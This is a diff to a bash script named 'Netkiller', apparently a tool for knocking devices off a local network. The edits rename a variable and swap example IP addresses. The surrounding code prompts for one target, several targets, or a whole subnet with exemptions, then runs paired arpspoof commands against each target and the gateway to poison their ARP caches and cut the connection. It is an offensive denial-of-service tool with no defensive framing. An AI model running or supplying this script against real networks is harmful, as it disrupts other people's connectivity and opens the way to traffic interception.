@@ -33,7 +33,7 @@ GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
 CIDR=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')
 
 # Detect device IP
-IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
+MYIP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
 echo ""
 
 echo "Current Network Configurations"
@@ -74,22 +74,22 @@ echo ""
 
 case $target_type in
     1)
-        echo "Single Target User IP: e.g 192.168.1.123"
+        echo "Single Target User IP: e.g 10.0.0.123"
         read -p "Enter User IP: " TARGET
         TARGETS=($TARGET)
         ;;
     2)
-        echo "Multiple Target User IP's: e.g 192.168.1.123,192.168.1.124..."
+        echo "Multiple Target User IP's: e.g 10.0.0.123,10.0.0.124"
         read -p "Enter Multiple Users IP's:  " target_input
         IFS=',' read -ra TARGETS <<< "$target_input"
         ;;
     3)
-        echo "Target All Users IP's in Subnet: e.g 192.168.1.1/24"
+        echo "Target All Users IP's in Subnet: e.g 10.0.0.1/20"
         read -p "Enter Subnet: " subnet
 
         # Validate subnet
         if ! ipcalc -n "$subnet" &>/dev/null; then
-            echo "Invalid subnet format. Please use CIDR notation e.g 192.168.1.1/24"
+            echo "Invalid subnet format. Please use CIDR notation e.g 10.0.0.1/20"
             exit 1
         fi
 
@@ -134,7 +134,7 @@ case $target_type in
         read -p "Do you want to exempt any additional IP's from the subnet? (y/n) " exempt_choice
         if [[ "$exempt_choice" =~ ^[Yy]$ ]]; then
             echo ""
-            echo "Enter IP's to exempt: e.g 192.168.1.110,192.168.1.120"
+            echo "Enter IP's to exempt: e.g 10.0.0.110,10.0.0.120"
             read -p "> " exempt_input
             IFS=',' read -ra EXEMPTS <<< "$exempt_input"
 
@@ -179,7 +179,7 @@ fi
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
     echo ""
-    echo "Netkiller kills the connection for $TARGET"
+    echo "Netkiller killing the connection for $TARGET"
     arpspoof -i $INTERFACE -t $TARGET $GATEWAY >/dev/null 2>&1 &
     PIDS+=($!)
     arpspoof -i $INTERFACE -t $GATEWAY $TARGET >/dev/null 2>&1 &
